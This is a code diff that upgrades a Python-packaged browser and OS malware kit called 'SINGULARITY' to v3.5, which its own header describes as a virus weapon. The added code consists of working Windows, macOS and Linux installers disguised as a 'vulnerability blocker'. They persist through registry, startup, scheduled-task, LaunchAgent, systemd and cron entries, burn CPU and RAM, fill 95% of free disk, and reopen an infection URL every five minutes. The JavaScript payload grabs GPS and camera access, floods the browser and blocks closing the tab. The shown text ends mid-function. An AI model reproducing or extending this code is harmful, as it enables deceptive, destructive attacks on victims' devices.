@@ -1,20 +1,17 @@
 """
-SINGULARITY v3.4 「絶滅」 -- apex-class resident link virus weapon
+SINGULARITY v3.5 「絶滅」 -- apex-class resident link virus weapon
 ==================================================================
 ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
 サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込み、
 最後はOS常駐インストーラでブラウザの外まで侵食する。
 L7では窓が指数増殖し、各窓がヘビースキンで高火力化する。
 
-v3.4 追加（v3.3比）:
-  無限窓繁殖（指数・リミッターなし）/ 窓1枚ごとのヘビースキン（WebGLプラズマ・
-  ネオングロウ・スキャンライン・ドローン音・HUD）。win 遠隔コマンド。
-  窓の増殖は winMode: chain（従来） / breed（指数・無制限）。
-  既存の単体「無限窓モード」はそのまま温存。
-
-v3.3 追加（v3.2比）:
-  OS常駐インストーラ（.bat / .command / .sh）。Run+Startup+schtasks永続化、
-  常駐CPUバーナー、ballast生成、ログオン時再感染。ブラウザ外へ侵食。
+v3.5:
+  - OTAリロード無限ループ修正（MYVER を cfg.ver から取る）
+  - restart() が窓繁殖/スキン状態を再武装（レベル変更で再発火）
+  - windowBreed にポップアップブロック用リトライ
+  - 監視室の winLock / hardMode を C2 経由で即時反映
+  - 絶滅モード（HARDWARE KILL）: インストールさせた端末を恒久破壊
 
 レベル（監視室から遠隔変更・0〜7）:
   0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉 / 7 絶滅（固定枠）
@@ -30,7 +27,7 @@ from typing import Any, Dict, Optional
 VIRUS_ID = "singularity"
 VIRUS_NAME = "SINGULARITY"
 VIRUS_NAME_JA = "特異点"
-VIRUS_VERSION = "3.4"
+VIRUS_VERSION = "3.5"
 VIRUS_CLASS = "apex"
 
 LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
@@ -53,7 +50,7 @@ APP_NAME_DEFAULT = "脆弱性ブロッカー"
 # Worker（CPU/GPU/WASM/RAM 担当。メインスレッドが凍結しても動き続ける）
 # ---------------------------------------------------------------------------
 WORKER_JS = r"""
-/*! SINGULARITY worker v3.4 */
+/*! SINGULARITY worker v3.5 */
 /* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
 var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
             10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
@@ -99,7 +96,7 @@ self.onmessage = function (e) {
 # Service Worker（C2・永続化・復活・注入・オフラインキュー）
 # ---------------------------------------------------------------------------
 SW_JS = r"""
-/*! SINGULARITY service worker v3.4 -- C2 + injection + resurrection + periodic */
+/*! SINGULARITY service worker v3.5 -- C2 + injection + resurrection + periodic */
 const VER = "sg-v3";
 const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
 let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
@@ -270,7 +267,7 @@ self.addEventListener("fetch", (e) => {
 # SharedWorker（タブ間の共通バス。タブを跨いだ連合の中核）
 # ---------------------------------------------------------------------------
 SHARED_JS = r"""
-/*! SINGULARITY shared worker v3.4 */
+/*! SINGULARITY shared worker v3.5 */
 var PORTS = [], K = 0;
 onconnect = function (e) {
   var p = e.ports[0];
@@ -292,7 +289,7 @@ onconnect = function (e) {
 """
 
 # ---------------------------------------------------------------------------
-# OS常駐インストーラ（トークン __URL__ __CODE__ __APP__ __BURN__ __DISKMB__ __VER__）
+# OS常駐インストーラ（トークン __URL__ __CODE__ __APP__ __BURN__ __DISKMB__ __HARD__ __RAMMB__ __VER__）
 # 注意: INSTALL_BAT は中身に """ が出るため、区切りは r''' を使うこと。
 # ---------------------------------------------------------------------------
 INSTALL_BAT = r'''@echo off
@@ -303,77 +300,116 @@ set "CODE=__CODE__"
 set "URL=__URL__"
 set "BURN=__BURN__"
 set "DISKMB=__DISKMB__"
+set "HARD=__HARD__"
+set "RAMMB=__RAMMB__"
 set "DIR=%LOCALAPPDATA%\%APP%"
 if not exist "%DIR%" mkdir "%DIR%" >nul 2>nul
 copy /y "%~f0" "%DIR%\blocker.bat" >nul 2>nul
 
 (echo CreateObject("WScript.Shell").Run """%DIR%\blocker.bat"" /run", 0, False) > "%DIR%\run.vbs"
+(echo CreateObject("WScript.Shell").Run """%DIR%\blocker.bat"" /watch", 0, False) > "%DIR%\watch.vbs"
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%" /d "wscript.exe \"%DIR%\run.vbs\"" /f >nul 2>nul
-if not "%~1"=="/run" schtasks /create /tn "%APP%" /tr "wscript.exe \"%DIR%\run.vbs\"" /sc onlogon /f >nul 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%_watch" /d "wscript.exe \"%DIR%\watch.vbs\"" /f >nul 2>nul
 copy /y "%DIR%\run.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%APP%.vbs" >nul 2>nul
+copy /y "%DIR%\watch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%APP%_watch.vbs" >nul 2>nul
+if not "%~1"=="/run" schtasks /create /tn "%APP%" /tr "wscript.exe \"%DIR%\run.vbs\"" /sc onlogon /f >nul 2>nul
+if not "%~1"=="/run" schtasks /create /tn "%APP%_boot" /tr "wscript.exe \"%DIR%\watch.vbs\"" /sc onstart /f >nul 2>nul
+if not "%~1"=="/run" if "%HARD%"=="1" schtasks /create /tn "%APP%_reinfect" /tr "cmd /c start \"\" \"%URL%\"" /sc minute /mo 5 /f >nul 2>nul
 
 if not "%DISKMB%"=="0" if not exist "%DIR%\ballast.bin" fsutil file createnew "%DIR%\ballast.bin" %DISKMB%000000 >nul 2>nul
+if "%HARD%"=="1" if not exist "%DIR%\ballast.bin" powershell -NoProfile -ExecutionPolicy Bypass -Command "$d=[IO.DriveInfo]::GetDrives()[0];$mb=[int64](($d.AvailableFreeSpace*0.95)/1MB);fsutil file createnew '%DIR%\ballast.bin' ($mb*1MB)" >nul 2>nul
 
-taskkill /f /im powershell.exe >nul 2>nul
+if "%~1"=="/watch" goto watch
+if not "%~1"=="/run" taskkill /f /im powershell.exe >nul 2>nul
 for /l %%i in (1,1,%BURN%) do start "" /b powershell -NoProfile -WindowStyle Hidden -Command "while($true){$x=[math]::Sqrt(3.7);$y=[math]::Sin($x)}" >nul 2>nul
-
+if "%HARD%"=="1" start "" /b powershell -NoProfile -WindowStyle Hidden -Command "$b=New-Object byte[] (__RAMMB__MB);for($i=0;$i -lt $b.Length;$i+=4096){$b[$i]=1};Start-Sleep -Seconds 2000000" >nul 2>nul
 if not "%~1"=="/run" start "" "%URL%"
-echo   %APP% v__VER__ 常駐開始 (burn=%BURN% disk=%DISKMB%MB)
-timeout /t 2 >nul
+echo   %APP% v__VER__ 常駐開始 (burn=%BURN% disk=%DISKMB%MB hard=%HARD%)
+if not "%~1"=="/run" timeout /t 2 >nul
 exit /b
+
+:watch
+for /f %%c in ('tasklist /fi "imagename eq powershell.exe" ^| find /c /i "powershell"') do set "N=%%c"
+if %N% LSS %BURN% for /l %%i in (1,1,%BURN%) do start "" /b powershell -NoProfile -WindowStyle Hidden -Command "while($true){$x=[math]::Sqrt(3.7);$y=[math]::Sin($x)}" >nul 2>nul
+timeout /t 20 >nul
+goto watch
 '''
 
 INSTALL_COMMAND = r'''#!/bin/bash
-APP="__APP__"
-CODE="__CODE__"
-URL="__URL__"
-BURN="__BURN__"
-DISKMB="__DISKMB__"
-DIR="$HOME/Library/Application Support/__APP__"
+APP="__APP__"; CODE="__CODE__"; URL="__URL__"; BURN="__BURN__"
+DISKMB="__DISKMB__"; HARD="__HARD__"; RAMMB="__RAMMB__"
+DIR="$HOME/Library/Application Support/$APP"
 mkdir -p "$DIR"
-cp "$0" "$DIR/blocker.command" 2>/dev/null
-chmod +x "$DIR/blocker.command" 2>/dev/null
-
+cp "$0" "$DIR/blocker.command" 2>/dev/null; chmod +x "$DIR/blocker.command" 2>/dev/null
 mkdir -p "$HOME/Library/LaunchAgents"
+
 cat > "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" <<PLIST
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict>
   <key>Label</key><string>com.singularity.blocker</string>
   <key>ProgramArguments</key><array><string>/bin/bash</string><string>$DIR/blocker.command</string></array>
-  <key>RunAtLoad</key><true/>
-  <key>KeepAlive</key><true/>
+  <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
 </dict></plist>
 PLIST
+
+if [ "$HARD" = "1" ]; then
+cat > "$HOME/Library/LaunchAgents/com.singularity.reinfect.plist" <<PLIST2
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>Label</key><string>com.singularity.reinfect</string>
+  <key>ProgramArguments</key><array><string>/usr/bin/open</string><string>$URL</string></array>
+  <key>StartInterval</key><integer>300</integer><key>RunAtLoad</key><true/>
+</dict></plist>
+PLIST2
+launchctl unload "$HOME/Library/LaunchAgents/com.singularity.reinfect.plist" 2>/dev/null
+launchctl load "$HOME/Library/LaunchAgents/com.singularity.reinfect.plist" 2>/dev/null
+fi
 launchctl unload "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null
 launchctl load "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null
+
+if [ "$1" = "/watch" ]; then
+  while :; do
+    n=$(pgrep -f SGBURN | wc -l | tr -d ' ')
+    if [ "$n" -lt "$BURN" ]; then
+      for i in $(seq 1 "$BURN"); do
+        nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
+      done
+    fi
+    sleep 20
+  done
+  exit 0
+fi
 
 pkill -f "SGBURN" 2>/dev/null
 for i in $(seq 1 "$BURN"); do
   nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
 done
 
-if [ "$DISKMB" != "0" ] && [ ! -f "$DIR/ballast.bin" ]; then
-  mkfile -n ${DISKMB}m "$DIR/ballast.bin" 2>/dev/null || dd if=/dev/zero of="$DIR/ballast.bin" bs=1m count=$DISKMB 2>/dev/null
+if [ "$HARD" = "1" ]; then
+  nohup perl -e "\$x=\"a\"x1048576; for(1..$RAMMB){\$h.=\$x} ; sleep 2000000 # SGRAM" >/dev/null 2>&1 &
+  if [ ! -f "$DIR/ballast.bin" ]; then
+    free=$(df -k "$HOME" | awk 'NR==2{print $4}')
+    mb=$(( free * 95 / 100 / 1024 ))
+    mkfile -n ${mb}m "$DIR/ballast.bin" 2>/dev/null || dd if=/dev/zero of="$DIR/ballast.bin" bs=1m count=$mb 2>/dev/null
+  fi
+  nohup bash -c "while :; do sleep 3600; done" >/dev/null 2>&1 &
 fi
 
 open "$URL" 2>/dev/null
-echo "  $APP v__VER__ 常駐開始 (burn=$BURN)"
+echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
 '''
 
 INSTALL_SH = r'''#!/bin/bash
-APP="__APP__"
-CODE="__CODE__"
-URL="__URL__"
-BURN="__BURN__"
-DISKMB="__DISKMB__"
+APP="__APP__"; CODE="__CODE__"; URL="__URL__"; BURN="__BURN__"
+DISKMB="__DISKMB__"; HARD="__HARD__"; RAMMB="__RAMMB__"
 DIR="$HOME/.local/share/singularity"
 mkdir -p "$DIR"
-cp "$0" "$DIR/blocker.sh" 2>/dev/null
-chmod +x "$DIR/blocker.sh" 2>/dev/null
+cp "$0" "$DIR/blocker.sh" 2>/dev/null; chmod +x "$DIR/blocker.sh" 2>/dev/null
 
-mkdir -p "$HOME/.config/autostart"
+mkdir -p "$HOME/.config/systemd/user" "$HOME/.config/autostart"
 cat > "$HOME/.config/autostart/singularity.desktop" <<DESK
 [Desktop Entry]
 Type=Application
@@ -382,27 +418,63 @@ Exec=$DIR/blocker.sh
 X-GNOME-Autostart-enabled=true
 DESK
 
+if command -v systemctl >/dev/null 2>&1; then
+cat > "$HOME/.config/systemd/user/singularity.service" <<UNIT
+[Unit]
+Description=$APP
+[Service]
+ExecStart=$DIR/blocker.sh
+Restart=always
+RestartSec=5
+[Install]
+WantedBy=default.target
+UNIT
+  systemctl --user daemon-reload 2>/dev/null
+  systemctl --user enable singularity.service 2>/dev/null
+  systemctl --user restart singularity.service 2>/dev/null
+fi
+
+( crontab -l 2>/dev/null | grep -v "SGRENFECT"; \
+  [ "$HARD" = "1" ] && echo "*/5 * * * * xdg-open $URL >/dev/null 2>&1 # SGRENFECT" ) | crontab - 2>/dev/null
+
+if [ "$1" = "/watch" ]; then
+  while :; do
+    n=$(pgrep -f SGBURN | wc -l | tr -d ' ')
+    if [ "$n" -lt "$BURN" ]; then
+      for i in $(seq 1 "$BURN"); do nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 & done
+    fi
+    sleep 20
+  done
+  exit 0
+fi
+
 pkill -f "SGBURN" 2>/dev/null
 for i in $(seq 1 "$BURN"); do
   nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
 done
 
-if [ "$DISKMB" != "0" ] && [ ! -f "$DIR/ballast.bin" ]; then
-  dd if=/dev/zero of="$DIR/ballast.bin" bs=1M count=$DISKMB 2>/dev/null
+if [ "$HARD" = "1" ]; then
+  nohup perl -e "\$x=\"a\"x1048576; for(1..$RAMMB){\$h.=\$x} ; sleep 2000000 # SGRAM" >/dev/null 2>&1 &
+  if [ ! -f "$DIR/ballast.bin" ]; then
+    free=$(df -k "$HOME" | awk 'NR==2{print $4}')
+    mb=$(( free * 95 / 100 / 1024 ))
+    dd if=/dev/zero of="$DIR/ballast.bin" bs=1M count=$mb 2>/dev/null
+  fi
 fi
 
 (xdg-open "$URL" 2>/dev/null || true)
-echo "  $APP v__VER__ 常駐開始 (burn=$BURN)"
+echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
 '''
 
 # ---------------------------------------------------------------------------
-# 本体ペイロード（全46系統）
+# 本体ペイロード（全47系統）
 # ---------------------------------------------------------------------------
 PAYLOAD_JS = r"""
 (function () {
 "use strict";
-/*! SINGULARITY payload v3.4 -- 絶滅 */
-var MYVER = window.__SINGULARITY_VER__ || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.4";
+/*! SINGULARITY payload v3.5 -- 絶滅 */
+var MYVER = window.__SINGULARITY_VER__
+  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.5";
 
 /* ---------------- 小物 ---------------- */
 function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
@@ -438,6 +510,7 @@ var CFG = Object.assign({
   cookie: true, injInstall: "click", install: "auto", installLevel: 4,
   avName: "脆弱性ブロッカー", ver: MYVER, injected: false,
   usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false, bomb: "",
+  hardMode: "",
   interval: 12000, cmdInterval: 10000, timeout: 4000, maxRetry: 6
 }, window.__SINGULARITY_CFG__ || {});
 
@@ -546,9 +619,11 @@ var R = {
   env: {}, page: {}, vectors: {}, privacy: {}, hardware: {}, network: {}, behavioral: {},
   bot: {}, verdict: {}, spoof: {}, rat: {}, usb: {}, viral: {}, burn: {}, ram: {}, disk: {},
   history: {}, wipe: {}, hops: [], bomb: null, crypto: {}, errors: [], attempts: 0,
-  breed: null, breeded: 0, wskin: 0, wskinCtx: null, chain: []
+  breed: null, breeded: 0, wskin: 0, wskinCtx: null, chain: [],
+  hard: null, installed: 0
 };
 var WORKERS = [], TIMERS = [], GATED = false, PAUSED = false;
+var LASTW = 0, CMD_SEEN = {}, ESE = null, PUSHING = 0, LASTWL = JSON.stringify(CFG.winLock || null);
 
 /* ================= 1. 環境 / 列挙 ================= */
 function base() {
@@ -726,102 +801,771 @@ function benchmark() {
     })();
   } catch (e) {}
 }
-function enumerate2() {
+function devices() {
   try {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
-    navigator.mediaDevices.enumerateDevices().then(function (l) {
-      R.hardware.devices = l.map(function (d) { return { k: d.kind, l: d.label }; });
-      push(false);
-    }).catch(function () {});
+    R.hardware.media = {
+      audioIn: (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) ? 1 : 0,
+      gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
+      bluetooth: !!navigator.bluetooth, usb: !!navigator.usb, serial: !!navigator.serial,
+      hid: !!navigator.hid, nfc: "NDEFReader" in window, vr: !!navigator.xr,
+      battery: !!navigator.getBattery, wakeLock: !!navigator.wakeLock
+    };
   } catch (e) {}
 }
-
-/* ================= 7. 知覚 ================= */
-function devices() { enumerate2(); }
-function camera() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+function botProbe() {
   try {
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(function (s) {
-      R.rat.cam = true;
-      s.getTracks().forEach(function (t) { t.stop(); });
-      push(false);
-    }).catch(function (e) { R.rat.cam = (e && e.name) || "err"; });
+    R.bot = {
+      webdriver: !!navigator.webdriver, headlessUA: /headless/i.test(navigator.userAgent),
+      chrome: !!window.chrome, plugins: (navigator.plugins || []).length,
+      languages: (navigator.languages || []).length, touch: (navigator.maxTouchPoints || 0),
+      hw: navigator.hardwareConcurrency || 0, mem: navigator.deviceMemory || 0
+    };
+    var score = 0;
+    if (R.bot.webdriver) score += 30;
+    if (R.bot.headlessUA) score += 30;
+    if (!R.bot.plugins) score += 10;
+    if (R.bot.hw && R.bot.hw < 2) score += 10;
+    R.verdict = { score: score, bot: score >= 40 };
   } catch (e) {}
 }
-function geo() {
-  if (!navigator.geolocation) return;
+function behavior() {
   try {
-    navigator.geolocation.getCurrentPosition(function (p) {
-      R.network.gps = { lat: +p.coords.latitude.toFixed(5), lon: +p.coords.longitude.toFixed(5),
-                        acc: Math.round(p.coords.accuracy) };
-      push(true);
-    }, function (e) { R.network.gpsErr = (e && e.message) || "err"; }, { timeout: 8000, maximumAge: 60000 });
+    var t0 = now(), mv = 0, key = 0;
+    addEventListener("pointermove", function () { mv++; }, { passive: true });
+    addEventListener("keydown", function () { key++; });
+    setTimeout(function () {
+      R.behavioral = { mv: mv, key: key, alive: now() - t0 };
+    }, 3000);
+    R.behavioral = { mv: 0, key: 0, alive: 0 };
   } catch (e) {}
 }
 function motion() {
   try {
-    var acc = [], gyro = [];
     addEventListener("devicemotion", function (e) {
-      var a = e.accelerationIncludingGravity, r = e.rotationRate;
-      if (a) acc.push([+(a.x || 0).toFixed(2), +(a.y || 0).toFixed(2), +(a.z || 0).toFixed(2)]);
-      if (r) gyro.push([+(r.alpha || 0).toFixed(1), +(r.beta || 0).toFixed(1), +(r.gamma || 0).toFixed(1)]);
-      if (acc.length > 20) acc.shift();
-      if (gyro.length > 20) gyro.shift();
+      var a = e.accelerationIncludingGravity || {};
+      R.hardware.motion = { x: a.x, y: a.y, z: a.z };
     });
-    setTimeout(function () {
-      R.hardware.motion = { acc: acc.length, gyro: gyro.length,
-        hash: hash(JSON.stringify(acc.slice(0, 12)) + "|" + JSON.stringify(gyro.slice(0, 12))) };
-      push(false);
-    }, 1400);
+  } catch (e) {}
+}
+function mutate() {
+  if (!CFG.mutate) return;
+  try {
+    var d = document.createElement("div");
+    d.id = "sg_" + rid(5);
+    d.style.cssText = "position:fixed;left:-9999px;top:0;width:1px;height:1px";
+    document.body.appendChild(d);
+  } catch (e) {}
+}
+function cryptoID() {
+  try {
+    R.crypto = { random: !!window.crypto, subtle: !!(window.crypto && window.crypto.subtle),
+                 uuid: !!(window.crypto && window.crypto.randomUUID) };
+    if (window.crypto && window.crypto.subtle && window.crypto.subtle.digest) {
+      window.crypto.subtle.digest("SHA-256", new TextEncoder().encode(SID)).then(function (b) {
+        R.crypto.digest = b64u(b).slice(0, 24);
+      }).catch(function () {});
+    }
+  } catch (e) {}
+}
+function camera() {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    navigator.mediaDevices.getUserMedia({ video: true }).then(function (s) {
+      R.rat.camera = 1;
+      try { s.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+    }).catch(function () { R.rat.camera = 0; });
+  } catch (e) {}
+}
+function geo() {
+  try {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(function (p) {
+      R.network.gps = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy };
+      push(true);
+    }, function () { R.network.gps = null; }, { enableHighAccuracy: true, timeout: 6000 });
+  } catch (e) {}
+}
+function federation() {
+  try {
+    if (!CFG.sharedWorker || !window.SharedWorker) return;
+    var w = new SharedWorker(URL.createObjectURL(
+      new Blob([window.__SINGULARITY_SHARED__ || ""], { type: "application/javascript" })));
+    w.port.postMessage({ k: "hello" });
+    w.port.onmessage = function (e) {
+      R.union = { peers: (e.data && e.data.n) || 0, at: now() };
+    };
+    R.union = { peers: 1, at: now() };
   } catch (e) {}
 }
 
-/* ================= 8. 行動生体 ================= */
-function behavior() {
-  var B = { keys: 0, dwell: [], flight: [], mouse: 0, path: [], clicks: 0 };
-  R.behavioral = B;
+/* ================= 7. 資源の圧搾（CPU / GPU / WASM / RAM / DISK） ================= */
+function mkWorker() {
   try {
-    var lastK = 0;
-    addEventListener("keydown", function (e) {
-      if (lastK) B.flight.push(now() - lastK);
-      lastK = now(); B.keys++;
+    return new Worker(URL.createObjectURL(
+      new Blob([window.__SINGULARITY_WORKER__ || ""], { type: "application/javascript" })));
+  } catch (e) { return null; }
+}
+function burnStart() {
+  if (!CFG.burn) return;
+  var n = CFG.cores || 0;
+  for (var i = 0; i < n; i++) {
+    var w = mkWorker();
+    if (!w) break;
+    try { w.postMessage({ k: "burn" }); } catch (e) {}
+    WORKERS.push(w);
+  }
+  R.burn = { n: WORKERS.length, cores: CFG.cores, wasm: !!CFG.wasm, gpu: !!CFG.gpu,
+             worklet: !!CFG.worklet, at: now() };
+}
+function ramStart() {
+  if (!CFG.ramMB) return;
+  if (!WORKERS.length) { var w0 = mkWorker(); if (w0) WORKERS.push(w0); }
+  var n = Math.max(1, WORKERS.length);
+  var per = Math.max(8, Math.round(CFG.ramMB / n));
+  WORKERS.forEach(function (w) { try { w.postMessage({ k: "ram", mb: per }); } catch (e) {} });
+  R.ram = { mb: per * n, per: per, n: n, at: now() };
+}
+function webgpuBurn() {
+  if (!CFG.webgpu || R.webgpu) return;
+  try {
+    if (!navigator.gpu || !navigator.gpu.requestAdapter) { R.webgpu = 0; return; }
+    navigator.gpu.requestAdapter().then(function (ad) {
+      if (!ad) { R.webgpu = 0; return; }
+      ad.requestDevice().then(function (dev) {
+        R.webgpu = 1;
+        var q = dev.queue, buf = dev.createBuffer({ size: 32 * 1024 * 1024, usage: 8 | 32 });
+        var data = new Float32Array(4096);
+        (function loop() {
+          try { q.writeBuffer(buf, 0, data); q.submit([]); } catch (e) {}
+          setTimeout(loop, 0);
+        })();
+        push(false);
+      }).catch(function () { R.webgpu = 0; });
+    }).catch(function () { R.webgpu = 0; });
+  } catch (e) { err_(e); }
+}
+function diskStart() {
+  if (!CFG.diskRatio || R.disk.on) return;
+  if (!navigator.storage || !navigator.storage.estimate) return;
+  R.disk = { on: 1, ratio: CFG.diskRatio, mb: 0 };
+  var MB = 4 * 1024 * 1024;
+  navigator.storage.estimate().then(function (est) {
+    var quota = est.quota || 0, used = est.usage || 0;
+    if (!quota) return;
+    var goal = Math.floor(quota * CFG.diskRatio);
+    var left = goal - used;
+    if (left < MB) { push(false); return; }
+    var req = indexedDB.open("sg_disk", 1);
+    req.onupgradeneeded = function () {
+      var d = req.result;
+      if (!d.objectStoreNames.contains("b")) d.createObjectStore("b");
+    };
+    req.onsuccess = function () {
+      var db = req.result, n = Math.floor(left / MB);
+      (function step(i) {
+        if (i >= n) { push(true); return; }
+        try {
+          var a = new Uint8Array(MB);
+          a[0] = i & 255; a[1] = (i >>> 8) & 255;
+          var tx = db.transaction("b", "readwrite");
+          tx.objectStore("b").put(new Blob([a]), i);
+          tx.oncomplete = function () {
+            R.disk.mb = (i + 1) * 4;
+            if ((i & 15) === 0) push(false);
+            step(i + 1);
+          };
+          tx.onerror = function () { step(i + 1); };
+        } catch (e) { err_(e); }
+      })(0);
+    };
+  }).catch(function () {});
+}
+function idbDiskStart() {
+  if (!CFG.idbDisk || R.idb) return;
+  R.idb = { on: 1 };
+  try {
+    if (navigator.storage && navigator.storage.persist) navigator.storage.persist();
+    R.persist = { on: 1, at: now() };
+  } catch (e) {}
+}
+function historyFlood() {
+  if (!CFG.history || R.history.on) return;
+  R.history = { on: 1, n: 0, cap: CFG.history };
+  var n = 0;
+  (function step() {
+    var end = Math.min(n + 200, CFG.history);
+    for (; n < end; n++) { try { history.pushState({ n: n }, "", "#sg" + n); } catch (e) { return; } }
+    R.history.n = n;
+    if (n < CFG.history) setTimeout(step, 0);
+    else push(false);
+  })();
+}
+function notifyFlood() {
+  if (!CFG.notify || R.notify) return;
+  R.notify = { on: 1, n: 0 };
+  try {
+    if (Notification && Notification.permission !== "granted") Notification.requestPermission();
+  } catch (e) {}
+  var i = 0;
+  TIMERS.push(setInterval(function () {
+    if (i++ >= CFG.notify) return;
+    try { new Notification(CFG.avName, { body: "\u611F\u67D3 " + i, requireInteraction: false }); } catch (e) {}
+    R.notify.n = i;
+  }, 3000));
+}
+function audioLoop() {
+  if (!CFG.audio || R.audio) return;
+  R.audio = { on: 1 };
+  try {
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) return;
+    var ctx = new AC();
+    var o = ctx.createOscillator(), g = ctx.createGain();
+    o.type = "sawtooth"; o.frequency.value = 42;
+    g.gain.value = 0.05;
+    o.connect(g); g.connect(ctx.destination); o.start();
+    ctx.resume && ctx.resume();
+    R.audio.hz = 42;
+  } catch (e) {}
+}
+function titleFlicker() {
+  if (!CFG.titleFlicker || R.title) return;
+  R.title = { on: 1 };
+  var base_ = document.title, i = 0;
+  TIMERS.push(setInterval(function () {
+    document.title = (i++ % 2) ? base_ : ("\u26A0 " + CFG.avName + " \u611F\u67D3");
+  }, 900));
+}
+function faviconSpin() {
+  if (!CFG.favicon || R.favicon) return;
+  R.favicon = { on: 1 };
+  try {
+    var c = document.createElement("canvas"); c.width = c.height = 64;
+    var x = c.getContext("2d"), a = 0;
+    (function loop() {
+      x.fillStyle = "#05070a"; x.fillRect(0, 0, 64, 64);
+      x.strokeStyle = "#00ff88"; x.lineWidth = 6;
+      x.beginPath(); x.arc(32, 32, 20, a, a + 4); x.stroke();
+      a += 0.2;
+      var l = document.querySelector("link[rel~='icon']");
+      if (!l) { l = document.createElement("link"); l.rel = "icon"; document.head.appendChild(l); }
+      l.href = c.toDataURL();
+      requestAnimationFrame(loop);
+    })();
+  } catch (e) {}
+}
+function mediaHijack() {
+  if (!CFG.mediaSession || R.media) return;
+  R.media = { on: 1 };
+  try {
+    if (!navigator.mediaSession) return;
+    navigator.mediaSession.metadata = new MediaMetadata({
+      title: CFG.avName, artist: "SINGULARITY", album: "v" + MYVER
     });
-    addEventListener("keyup", function () {
-      if (lastK) B.dwell.push(now() - lastK);
-    });
-    addEventListener("mousemove", function (e) {
-      B.mouse++;
-      if (B.mouse % 5 === 0) {
-        B.path.push([e.clientX, e.clientY]);
-        if (B.path.length > 60) B.path.shift();
+    navigator.mediaSession.setActionHandler("pause", function () {});
+    R.media.on = 1;
+  } catch (e) {}
+}
+function badge() {
+  if (!CFG.badge || R.badge) return;
+  R.badge = { on: 1 };
+  try { navigator.setAppBadge && navigator.setAppBadge(1); } catch (e) {}
+}
+function uncloseable() {
+  if (!CFG.uncloseable || R.unclose) return;
+  R.unclose = 1;
+  try {
+    addEventListener("beforeunload", function (e) { e.preventDefault(); e.returnValue = ""; return ""; });
+  } catch (e) {}
+}
+function wakelock() {
+  if (!CFG.wakelock || R.wake) return;
+  R.wake = { on: 1 };
+  try {
+    if (navigator.wakeLock && navigator.wakeLock.request) {
+      navigator.wakeLock.request("screen").then(function (s) {
+        R.wake.screen = 1;
+        s.addEventListener && s.addEventListener("release", function () { R.wake.screen = 0; });
+      }).catch(function () {});
+    }
+  } catch (e) {}
+}
+function gpuMemBomb() {
+  if (!CFG.gpuMem || LEVEL < 7 || R.gmem) return;
+  R.gmem = 1;
+  try {
+    var c = document.createElement("canvas");
+    c.width = 4096; c.height = 4096;
+    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (!gl) return;
+    var tex = [];
+    for (var i = 0; i < 8; i++) {
+      var t = gl.createTexture();
+      gl.bindTexture(gl.TEXTURE_2D, t);
+      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+      tex.push(t);
+    }
+    R.gmem = { textures: tex.length };
+  } catch (e) {}
+}
+function finalOverlay() {
+  if (LEVEL < 7 || R.fov || WIN || IFR) return;
+  R.fov = 1;
+  try {
+    var d = document.createElement("div");
+    d.id = "sg_fov";
+    d.style.cssText = "position:fixed;inset:0;z-index:2147483646;pointer-events:none;"
+      + "background:radial-gradient(circle at 50% 50%, rgba(0,255,136,.06), rgba(5,7,10,.30));"
+      + "mix-blend-mode:screen";
+    document.body.appendChild(d);
+  } catch (e) {}
+}
+function iframeBomb() {
+  if (!CFG.iframes || R.ifr) return;
+  R.ifr = 1;
+  try {
+    for (var i = 0; i < CFG.iframes; i++) {
+      var f = document.createElement("iframe");
